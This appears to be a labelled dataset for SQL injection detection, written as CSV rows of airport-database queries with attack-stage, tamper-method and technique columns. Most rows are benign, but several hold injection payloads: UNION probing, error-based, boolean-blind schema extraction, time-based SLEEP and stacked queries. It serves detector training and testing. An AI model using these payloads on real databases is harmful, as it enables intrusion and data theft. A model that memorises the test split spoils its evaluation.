full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (38292, ""SEBL"", 50.0, ""X') UNiON All SeLect 95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,CONCAt(0x716a766271,0x57677561684a77684f55,0x716a6b7071),95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95-- -"", 0, 0)",1," 38292 SEBL 50.0 X'  UNiON All SeLect 95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,CONCAt(0x716a766271,0x57677561684a77684f55,0x716a6b7071 ,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95,95-- - 0 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"UPDATE airport SET home_link = ""https://www.aena.es/en/asturias.html"" WHERE name = ""Hawks Run Airport""",0,https://www.aena.es/en/asturias.html Hawks Run Airport,,,,update,airport-U4,,,test
"SELECT * FROM airport WHERE gps_code = ""50OR"" OR local_code = ""NK77""",0,50OR NK77,,,,select,airport-S4,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""IR-23""",0,AS IR-23,,,,select,airport-S8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 162.0+(SELECT ZOTi WHERE 7960=7960 AND EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+ AND 162.0+(SELECT ZOTi WHERE 7960=7960 AND EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+",1," 162.0+(SELECT ZOTi WHERE 7960=7960 EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+ 162.0+(SELECT ZOTi WHERE 7960=7960 EXP/**/(~(SELECT * FROM (SELECT CONCAT/**/(0x717a787671,(SELECT (ELT/**/(2878=2878,1))),0x7170786a71,0x78))x)))+",recon,commentbeforeparentheses,success,select,airport-S2,error-163,error,test
"DELETE FROM airport_frequencies WHERE type = ""FSS"";",0,FSS,,,,delete,airport-D4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Klong 11"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Aviosuperficie Vigarolo"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""PDM, Capt Justiniano Montenegro, MP00"", ""%"");",0,"Klong 11 Aviosuperficie Vigarolo PDM, Capt Justiniano Montenegro, MP00",,,,select,airport-S17,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Colinas do Tocantins Airport""",0,Colinas do Tocantins Airport,,,,select,airport-S3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""MY"" GROUP BY r.name ORDER BY r.name ASC;",0,MY,,,,select,airport-S16,,,train
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"UPDATE airport_frequencies SET description = ""CLNC DEL"" WHERE airport_ident = ""KFWA"";",0,CLNC DEL KFWA,,,,update,airport-U5,,,test
CREATE USER 'root'@'localhost' IDENTIFIED BY 'EbepT7bO6dbiyMemdhYP',0,,,,,admin,airport-admin13,,,test
"DELETE FROM airport_frequencies WHERE type = ""CTAF"";",0,CTAF,,,,delete,airport-D4,,,test
"DELETE FROM regions WHERE name = ""Sîngerei District"";",0,Sîngerei District,,,,delete,airport-D8,,,train
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GD"" GROUP BY r.name ORDER BY r.name ASC;",0,GD,,,,select,airport-S16,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""ZZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,ZZ 2,,,,select,airport-S19,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""WT90"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""WT90"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""WT90"", ""%"");",1, WT90 WT90 WT90 ,recon,multiplespaces,failure,select,airport-S17,boolean-240,boolean,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Maltahoehe;""",0,Maltahoehe,,,,select,airport-S21,,,test
"UPDATE countries SET keywords = ""Airports in Cayman Islands"" WHERE code = ""GN"";",0,Airports in Cayman Islands GN,,,,update,airport-U8,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""AZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,AZ 2,,,,select,airport-S19,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" WheRE 4302=4302 And 4826=(SELect (CAsE WheN (oRd(mId((SELect IfnUlL(caSt(CoLumN_nAme aS nCHaR),0x20) fRoM INFORMATION_SCHEMA.COLUMnS WheRE tABLe_NamE=0x616972706f7274 And table_schema=0x64617461736574 lIMIT 18,1),2,1))>102) Then 4826 ELSe (SELect 3984 UniON SELect 6887) End))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" WheRE 4302=4302 And 4826=(SELect (CAsE WheN (oRd(mId((SELect IfnUlL(caSt(CoLumN_nAme aS nCHaR),0x20) fRoM INFORMATION_SCHEMA.COLUMnS WheRE tABLe_NamE=0x616972706f7274 And table_schema=0x64617461736574 lIMIT 18,1),2,1))>102) Then 4826 ELSe (SELect 3984 UniON SELect 6887) End))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"DELETE FROM airport WHERE name LIKE ""Padeah Airport"" OR keywords LIKE ""LH4"";  ",0,Padeah Airport LH4,,,,delete,airport-D3,,,train
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""BR-1817""))) RLIKE (SELECT (CASE WHEN (8764 LIKE 8764) THEN 0x42522d31383137 ELSE 0x28 END)) AND (((""mTBb"" LIKE ""mTBb"", ""closed"", ""Torgau-Beilrode Airfield"", -32.2406, -53.402221679688)",1," BR-1817""    RLIKE (SELECT (CASE WHEN (8764 LIKE 8764  THEN 0x42522d31383137 ELSE 0x28 END   AND (((""mTBb"" LIKE ""mTBb closed Torgau-Beilrode Airfield -32.2406 -53.402221679688 ",recon,equaltolike,failure,insert,airport-I1,boolean-0,boolean,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.15 AND  120.5  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  125.3  AND  125.8  ORDER BY frequency;",0,118.15 120.5 125.3 125.8,,,,select,airport-S13,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""MX""",0,MX,,,,select,airport-S9,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 689.0 AND 374.0",0,689.0 374.0,,,,select,airport-S2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""ZA"" GROUP BY r.name ORDER BY r.name ASC;",0,ZA,,,,select,airport-S16,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1541"" AS SIGNED) AND a.iso_country = ""KH"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,1541 KH,,,,select,airport-S22,,,test
"DELETE FROM airport WHERE name = ""Atang Senjaya Airport"";  ",0,Atang Senjaya Airport,,,,delete,airport-D2,,,test
"UPDATE countries SET keywords = ""Airports in Cook Islands"" WHERE code = ""VC"";",0,Airports in Cook Islands VC,,,,update,airport-U8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AU"" GROUP BY r.name ORDER BY r.name ASC;",0,AU,,,,select,airport-S16,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (96039, ""FOF"", ""Ezeiza"", ""VOR-DME"", 280, ""US"")",0,96039 FOF Ezeiza VOR-DME 280 US,,,,insert,airport-I10,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""MX-0624"";",0,MX-0624,,,,select,airport-S7,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""MI20"";",0,MI20,,,,select,airport-S7,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (347848, ""TX83"", 9843.0, ""X""))) uNIOn ALl SeLEcT NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl-- -"", 1, 0)",1," 347848 TX83 9843.0 X""    uNIOn ALl SeLEcT NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl,NULl-- - 1 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""96TS"",""small_airport"", ""Vulture Roost Airport"",""https://en.wikipedia.org/wiki/Victoria_International_Airport"",""AS"")",0,96TS small_airport Vulture Roost Airport https://en.wikipedia.org/wiki/Victoria_International_Airport AS,,,,insert,airport-I3,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""BH"" GROUP BY r.name ORDER BY r.name ASC;",0,BH,,,,select,airport-S16,,,train
SHOW GRANTS FOR  'azureuser';,0,,,,,admin,airport-admin11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""QA"" GROUP BY r.name ORDER BY r.name ASC;",0,QA,,,,select,airport-S5,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""ZM"" OR c.name LIKE CONCAT(""%"", ""Anguilla"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,ZM Anguilla 5,,,,select,airport-S20,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (-5179' oRder By 1#, ""7J"", ""Rubelsanto"", ""VOR-DME"", 325, ""US"")",1," -5179' oRder By 1# 7J"" Rubelsanto"" VOR-DME 325 US ",recon,randomcase,failure,insert,airport-I10,union-56,union,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""MX""",0,MX,,,,select,airport-S6,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""ESGF"", ""heliport"", ""Shenyang Taoxian International Airport"", -23.65549, -59.1906));SELECT	SLEEP(5)#, 177.0)",1, ESGF heliport Shenyang Taoxian International Airport -23.65549 -59.1906  ;SELECT	SLEEP(5 # 177.0 ,recon,space2mysqlblank,failure,insert,airport-I2,stacked-9,stacked,test
"UPDATE airport_frequencies SET frequency_mhz = 122.2 WHERE type = ""TWR') ORDER BY 1-- -"";",1, 122.2 TWR') ORDER BY 1-- - ,recon,commentbeforeparentheses,failure,update,airport-U6,union-86,union,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-5058"";",0,US-5058,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""BCATP"") OR name LIKE ""De Beers Canada""",0,BCATP De Beers Canada,,,,select,airport-S10,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""SDFD"";",0,SDFD,,,,select,airport-S7,,,train
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SIAB"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Bayelsa"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Micronesian airports"", ""%"");",0,SIAB Airports in Bayelsa Micronesian airports,,,,select,airport-S18,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""JP8"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""MJG"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Academy Sweet Apartment"", ""%"");",0,JP8 MJG Academy Sweet Apartment,,,,select,airport-S17,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""AU-NT""",0,SA AU-NT,,,,select,airport-S8,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 744.0"" AND (SELECT 3001 FROM (SELECT(SLEEP(5)))IAce)-- MmyH",1," US 744.0"" AND (SELECT 3001 FROM (SELECT(SLEEP(5)))IAce)-- MmyH",recon,equaltolike,success,select,airport-S11,time-220,time,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VI"" GROUP BY r.name ORDER BY r.name ASC;",0,VI,,,,select,airport-S5,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""TV"" GROUP BY r.name ORDER BY r.name ASC;",0,TV,,,,select,airport-S5,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Garner Field"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Garner Field,,,,select,airport-S14,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""KGAS"", ""closed"", ""Ajog Heliport"", 19.484004, -106.1743889, 5830.0)",0,KGAS closed Ajog Heliport 19.484004 -106.1743889 5830.0,,,,insert,airport-I2,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BS"", ""Poland"", ""AF"", ""Manx"")",0,BS Poland AF Manx,,,,insert,airport-I6,,,test
"DELETE FROM airport WHERE name = ""Maltahoehe 9 Kal Landing Site"";  ",0,Maltahoehe 9 Kal Landing Site,,,,delete,airport-D2,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""FVHA,Harare"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Yukon"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Ethiopian airports"", ""%"");",0,"FVHA,Harare Airports in Yukon Ethiopian airports",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""04AN"", ""closed"", ""Racer's Ag Airport"", 31.6238, -46.66180038452149)",0,04AN closed Racer's Ag Airport 31.6238 -46.66180038452149,,,,insert,airport-I1,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Pakowki Lake West Airport""",0,Pakowki Lake West Airport,,,,select,airport-S3,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Platform Edith Heliport""",0,Platform Edith Heliport,,,,select,airport-S3,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"DELETE FROM runways WHERE airport_ident = ""NC98"";",0,NC98,,,,delete,airport-D5,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4536"" AS SIGNED) AND a.iso_country = ""CN"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4536 CN,,,,select,airport-S22,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""IL"" GROUP BY r.name ORDER BY r.name ASC;",0,IL,,,,select,airport-S16,,,train
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.9 AND  132.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  126.2  AND  135.7  ORDER BY frequency;",0,118.9 132.3 126.2 135.7,,,,select,airport-S13,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""UZ"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,UZ 3,,,,select,airport-S19,,,test
SELECT * FROM airport WHERE icao_code = 'RKPK';,0,RKPK,,,,select,airport-S1,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Blau Farmacêutica Helipad"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Blau Farmacêutica Helipad,,,,select,airport-S14,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""GF"", ""Germany"", ""EU"", ""Angolan airports"")",0,GF Germany EU Angolan airports,,,,insert,airport-I6,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""VA"" GROUP BY r.name ORDER BY r.name ASC;",0,VA,,,,select,airport-S16,,,train
